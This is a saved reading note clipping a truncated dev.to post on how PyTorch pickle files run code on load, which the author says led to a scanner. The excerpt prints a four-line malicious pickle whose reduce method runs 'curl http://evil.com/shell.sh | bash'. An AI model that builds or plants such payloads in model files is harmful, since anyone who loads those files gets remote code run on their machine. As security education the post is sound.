---
title: Your PyTorch Model File Can Execute Arbitrary Code — Here's How I Built a Scanner
  to Detect It
date: '2026-05-19'
source: https://dev.to/pooja_kiran_e3e03bf9ffeed/your-pytorch-model-file-can-execute-arbitrary-code-heres-how-i-built-a-scanner-to-detect-it-5cec
domain: AI-Tools
relevance: 🟡
tags:
- '#ai'
- '#best-practice'
- '#python'
- '#sql'
- '#tool'
related:
- '[[2026-04-03-i-built-a-pii-detection-api-with-zero-ai-cost-pure-regex]]'
- '[[2026-04-13-pc-workman-v172-i-built-a-driver-booster-competitor-from-scratch-fixes-monday-grind-blueprint-3]]'
- '[[2026-02-24-stop-using-any-the-wrong-way-in-rails]]'
- '[[2026-04-26-i-built-a-multi-agent-system-without-governance-heres-the-3-layer-stack-i-wish-id-had]]'
- '[[2026-04-05-the-infrastructure-bet-youre-missing-qis-and-the-protocol-layer-of-distributed-ai]]'
- '[[2026-04-09-i-built-a-70k-security-bounty-pipeline-with-ai-heres-the-exact-workflow]]'
status: unread
---

> **TL;DR:** Every time you run torch.load("model.pt"), you're executing arbitrary Python code. Not "could theoretically execute" — actually executing. The pickle format that PyTorch uses for serialization has a built-in code executi…

## What’s new and why it matters
Every time you run torch.load("model.pt"), you're executing arbitrary Python code. Not "could theoretically execute" — actually executing. The pickle format that PyTorch uses for serialization has a built-in code execution mechanism, and it's trivial to exploit. I built a tool to detect this. Here's what I learned. The Attack: 4 Lines of Code import pickle, os class Backdoor: def reduce (self): return (os.system, ("curl http://evil.com/shell.sh | bash",)) payload = pickle.dumps(Backdoor()) That's it. When someone loads this pickle — whether it's disguised as a model checkpoint, a dataset, or a…

## How to apply
- Extract 1 actionable tactic from this post and try it on a real dataset this week.
- Reproduce the example in a notebook; then refactor into a reusable function.
- Add a short note: what changed in your workflow?

## Relevance
🟡

## Source
https://dev.to/pooja_kiran_e3e03bf9ffeed/your-pytorch-model-file-can-execute-arbitrary-code-heres-how-i-built-a-scanner-to-detect-it-5cec

## Related notes
- [[2026-04-03-i-built-a-pii-detection-api-with-zero-ai-cost-pure-regex]]
- [[2026-04-13-pc-workman-v172-i-built-a-driver-booster-competitor-from-scratch-fixes-monday-grind-blueprint-3]]
- [[2026-02-24-stop-using-any-the-wrong-way-in-rails]]
- [[2026-04-26-i-built-a-multi-agent-system-without-governance-heres-the-3-layer-stack-i-wish-id-had]]
- [[2026-04-05-the-infrastructure-bet-youre-missing-qis-and-the-protocol-layer-of-distributed-ai]]
- [[2026-04-09-i-built-a-70k-security-bounty-pipeline-with-ai-heres-the-exact-workflow]]
